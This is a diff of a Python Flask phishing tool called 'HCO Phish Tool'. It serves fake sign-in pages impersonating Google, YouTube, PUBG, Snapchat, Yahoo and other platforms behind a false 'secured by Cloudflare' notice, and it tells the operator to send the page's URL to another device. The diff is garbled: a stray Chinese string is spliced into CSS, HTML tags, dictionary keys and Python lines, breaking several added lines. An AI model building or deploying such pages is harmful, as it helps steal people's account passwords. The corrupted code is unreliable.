@@ -209,7 +209,6 @@ LOGIN_TEMPLATES = {
             height: 100vh;
         }
         .container {
-           极速快3
             max-width: 400px;
             width: 100%;
             text-align: center;
@@ -220,7 +219,6 @@ LOGIN_TEMPLATES = {
             font-weight: bold;
             margin-bottom: 30px;
         }
-       极速快3
         .login-box {
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -241,10 +239,9 @@ LOGIN_TEMPLATES = {
             color: white;
             border: none;
             border-radius: 4px;
-           极速快3
             font-size: 16px;
             font-weight: bold;
-            margin: 20px 极速快3;
+            margin: 20px 0;
         }
         .footer {
             margin-top: 20px;
@@ -261,7 +258,7 @@ LOGIN_TEMPLATES = {
             <p>Use your Google Account</p>
             <form>
                 <input type="email" placeholder="Email or phone">
-                <button>Next</极速快3ton>
+                <button>Next</button>
             </form>
         </div>
         <div class="footer">© 2024 Google</div>
@@ -280,7 +277,7 @@ PLATFORMS = {
     "5": {"name": "Free Fire", "path": "/freefire"},
     "6": {"name": "PUBG", "path": "/pubg"},
     "7": {"name": "BGMI", "path": "/bgmi"},
-    "8": {"name": "Threads", "极速快3path": "/threads"},
+    "8": {"name": "Threads", "path": "/threads"},
     "9": {"name": "Snapchat", "path": "/snapchat"},
     "10": {"name": "Yahoo", "path": "/yahoo"}
 }
@@ -321,6 +318,14 @@ def index():
             color: #666;
             font-size: 16px;
         }
+        a {
+            color: #f38020;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -330,6 +335,7 @@ def index():
         <p>This content is secured by Cloudflare security services</p>
         <p>Please use specific platform links:</p>
         <p><a href="/instagram">Instagram</a> | <a href="/facebook">Facebook</a> | <a href="/gmail">Gmail</a></p>
+        <p><a href="/youtube">YouTube</a> | <a href="/freefire">Free Fire</a> | <a href="/pubg">PUBG</a></p>
     </div>
 </body>
 </html>
@@ -387,7 +393,7 @@ def youtube():
             width: 100%;
             padding: 12px;
             background: #ff0000;
-            color: white;
+           极速快3 color: white;
             border: none;
             border-radius: 4px;
             font-weight: bold;
@@ -396,7 +402,7 @@ def youtube():
 </head>
 <body>
     <div class="header">YouTube</div>
-    <div极速快3 class="login-container">
+    <div class="login-container">
         <h2>Sign in</h2>
         <input type="email" placeholder="Email">
         <input type="password" placeholder="Password">
@@ -416,7 +422,7 @@ def pubg():
     return render_template_string(create_login_page("PUBG Mobile", "#ffcc00"))
 
 @app.route('/bgmi')
-def bgmi():
+极速快3def bgmi():
     return render_template_string(create_login_page("BGMI", "#3366ff"))
 
 @app.route('/threads')
@@ -482,7 +488,7 @@ def create_login_page(name, color):
 </head>
 <body>
     <div class="login-box">
-        <div class="logo">{name}</div>
+        <div class="logo">{极速快3name}</div>
         <input type="text" placeholder="Username or Email">
         <input type="password" placeholder="Password">
         <button>Login</button>
@@ -497,7 +503,7 @@ def print_banner():
     print("╔══════════════════════════════════════════════════╗")
     print("║                HCO Phish Tool                   ║")
     print("║                 by Azhar                        ║")
-极速快3    print("╚══════════════════════════════════════════════════╝")
+    print("╚══════════════════════════════════════════════════╝")
     print(f"{colors.END}")
     print(f"{colors.RED}Tool locked 🔐 To unlock subscribe our YouTube channel{colors.END}")
     print()
@@ -516,7 +522,7 @@ def open_youtube():
     try:
         # Try using am (Android activity manager)
         result = subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', 
-                               '-极速快3d', 'https://www.youtube.com'], 
+                               '-d', 'https://www.youtube.com'], 
                               capture_output=True, text=True, timeout=10)
         if result.returncode == 0:
             return True
@@ -567,7 +573,7 @@ def countdown():
     if choice in PLATFORMS:
         platform = PLATFORMS[choice]
         ip = get_ip()
-        print(f"\n{colors.BLUE}Selected: {platform['name']}{colors极速快3.END}")
+        print(f"\n{colors.BLUE}Selected: {platform['name']}{colors.END}")
         print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
         print(f"{colors.GREEN}Open this URL on another device (phone/computer){colors.END}")
         print(f"{colors.WHITE}Press Enter to continue...{colors.END}")
@@ -614,7 +620,7 @@ def run_flask():
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print(f"\n{colors.RED}Server stopped.{colors.END}")
+        print(f"\n极速快3{colors.RED}Server stopped.{colors.END}")
 
 def main():
     print_banner()
